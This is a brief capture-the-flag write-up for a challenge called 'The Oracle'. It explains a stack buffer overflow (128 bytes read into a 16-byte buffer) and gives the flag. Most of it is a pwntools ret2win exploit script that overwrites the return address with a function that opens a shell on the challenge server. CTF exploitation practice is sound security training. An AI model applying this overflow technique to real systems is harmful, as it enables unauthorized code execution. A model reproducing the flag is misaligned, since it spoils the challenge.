# The Oracle

It reads 128 bytes into a 16 byte buffer, and has a win function that pops a shell. ret2win.

#### Flag: flag{Be1ng_th3_1_is_JusT_l1ke_b3ing_in_l0v3}
```py
from pwn import *
e = ELF("./oracle")
p = e.process() if args.LOCAL else remote('chal.ctf.b01lers.com', 1015)
NUM_TO_RET = 0x10 + 8
padding = b'A'*NUM_TO_RET
payload = padding + p64(e.sym['win'])
p.sendline(payload)
p.interactive()
```
